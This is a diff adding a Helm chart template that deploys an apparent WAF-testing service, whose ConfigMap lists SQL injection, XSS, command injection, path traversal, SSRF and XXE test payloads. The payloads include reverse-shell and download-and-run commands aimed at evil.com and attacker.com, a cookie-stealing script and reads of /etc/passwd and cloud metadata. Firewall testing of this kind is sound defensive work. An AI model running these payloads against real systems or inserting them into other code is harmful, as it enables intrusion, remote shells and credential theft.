@@ -1,0 +1,202 @@
+{{- if .Values.wafTester.enabled }}
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: {{ include "cloud-relay.fullname" . }}-waf
+  labels:
+    {{- include "cloud-relay.labels" . | nindent 4 }}
+    app.kubernetes.io/component: waf-tester
+spec:
+  replicas: {{ .Values.wafTester.replicaCount }}
+  selector:
+    matchLabels:
+      {{- include "cloud-relay.selectorLabels" . | nindent 6 }}
+      app.kubernetes.io/component: waf-tester
+  template:
+    metadata:
+      labels:
+        {{- include "cloud-relay.selectorLabels" . | nindent 8 }}
+        app.kubernetes.io/component: waf-tester
+    spec:
+      serviceAccountName: {{ include "cloud-relay.serviceAccountName" . }}
+      securityContext:
+        {{- toYaml .Values.podSecurityContext | nindent 8 }}
+      containers:
+        - name: waf-tester
+          securityContext:
+            {{- toYaml .Values.securityContext | nindent 12 }}
+          image: "{{ .Values.wafTester.image.repository }}:{{ .Values.wafTester.image.tag }}"
+          imagePullPolicy: {{ .Values.global.imagePullPolicy }}
+          ports:
+            - name: https
+              containerPort: 8443
+              protocol: TCP
+            - name: metrics
+              containerPort: 9090
+              protocol: TCP
+          env:
+            - name: ENVIRONMENT
+              value: {{ .Values.global.environment }}
+            - name: DOMAIN
+              value: {{ .Values.domain }}
+            - name: LOG_LEVEL
+              value: {{ .Values.logging.level }}
+            # WAF Testing configuration
+            - name: PAYLOAD_DIR
+              value: /payloads/waf
+            - name: ENABLE_SQLI_TESTS
+              value: {{ .Values.wafTester.tests.sqli | quote }}
+            - name: ENABLE_XSS_TESTS
+              value: {{ .Values.wafTester.tests.xss | quote }}
+            - name: ENABLE_RCE_TESTS
+              value: {{ .Values.wafTester.tests.rce | quote }}
+            - name: ENABLE_LFI_TESTS
+              value: {{ .Values.wafTester.tests.lfi | quote }}
+            - name: ENABLE_SSRF_TESTS
+              value: {{ .Values.wafTester.tests.ssrf | quote }}
+            - name: ENABLE_XXE_TESTS
+              value: {{ .Values.wafTester.tests.xxe | quote }}
+            # Rate limiting for tests
+            - name: MAX_REQUESTS_PER_SECOND
+              value: {{ .Values.wafTester.rateLimit | quote }}
+            # Database
+            - name: DB_HOST
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.database.existingSecret }}
+                  key: host
+            - name: DB_PORT
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.database.existingSecret }}
+                  key: port
+            - name: DB_NAME
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.database.existingSecret }}
+                  key: database
+            - name: DB_USER
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.database.existingSecret }}
+                  key: username
+            - name: DB_PASSWORD
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.database.existingSecret }}
+                  key: password
+            # Redis for caching results
+            - name: REDIS_HOST
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.redis.existingSecret }}
+                  key: host
+            - name: REDIS_PORT
+              valueFrom:
+                secretKeyRef:
+                  name: {{ .Values.redis.existingSecret }}
+                  key: port
+          volumeMounts:
+            - name: waf-payloads
+              mountPath: /payloads/waf
+              readOnly: true
+          livenessProbe:
+            httpGet:
+              path: /health
+              port: https
+              scheme: HTTPS
+            initialDelaySeconds: 30
+            periodSeconds: 10
+          readinessProbe:
+            httpGet:
+              path: /ready
+              port: https
+              scheme: HTTPS
+            initialDelaySeconds: 5
+            periodSeconds: 5
+          resources:
+            {{- toYaml .Values.wafTester.resources | nindent 12 }}
+      volumes:
+        - name: waf-payloads
+          configMap:
+            name: {{ include "cloud-relay.fullname" . }}-waf-payloads
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: {{ include "cloud-relay.fullname" . }}-waf
+  labels:
+    {{- include "cloud-relay.labels" . | nindent 4 }}
+    app.kubernetes.io/component: waf-tester
+spec:
+  type: ClusterIP
+  ports:
+    - port: 443
+      targetPort: https
+      protocol: TCP
+      name: https
+    - port: 9090
+      targetPort: metrics
+      protocol: TCP
+      name: metrics
+  selector:
+    {{- include "cloud-relay.selectorLabels" . | nindent 4 }}
+    app.kubernetes.io/component: waf-tester
+---
+# WAF test payloads ConfigMap
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: {{ include "cloud-relay.fullname" . }}-waf-payloads
+  labels:
+    {{- include "cloud-relay.labels" . | nindent 4 }}
+    app.kubernetes.io/component: waf-tester
+data:
+  sqli.txt: |
+    ' OR '1'='1
+    ' OR '1'='1'--
+    ' OR '1'='1'/*
+    1' ORDER BY 1--+
+    1' ORDER BY 2--+
+    1' UNION SELECT NULL--+
+    1' UNION SELECT NULL,NULL--+
+    admin'--
+    ' UNION SELECT @@version--
+    1; DROP TABLE users--
+  xss.txt: |
+    <script>alert('XSS')</script>
+    <img src=x onerror=alert('XSS')>
+    <svg onload=alert('XSS')>
+    javascript:alert('XSS')
+    <body onload=alert('XSS')>
+    <iframe src="javascript:alert('XSS')">
+    "><script>alert('XSS')</script>
+    '><script>alert('XSS')</script>
+    <script>document.location='http://evil.com/'+document.cookie</script>
+  rce.txt: |
+    ; ls -la
+    | cat /etc/passwd
+    `whoami`
+    $(id)
+    ; nc -e /bin/sh attacker.com 4444
+    | curl http://evil.com/shell.sh | sh
+    && wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd
+  lfi.txt: |
+    ../../../etc/passwd
+    ....//....//....//etc/passwd
+    /etc/passwd%00
+    ..%252f..%252f..%252fetc/passwd
+    /proc/self/environ
+    php://filter/convert.base64-encode/resource=index.php
+    file:///etc/passwd
+  ssrf.txt: |
+    http://localhost/admin
+    http://127.0.0.1/admin
+    http://169.254.169.254/latest/meta-data/
+    http://metadata.google.internal/
+    http://[::1]/admin
+    gopher://localhost:6379/_INFO
+  xxe.txt: |
+    <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+    <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>
+{{- end }}
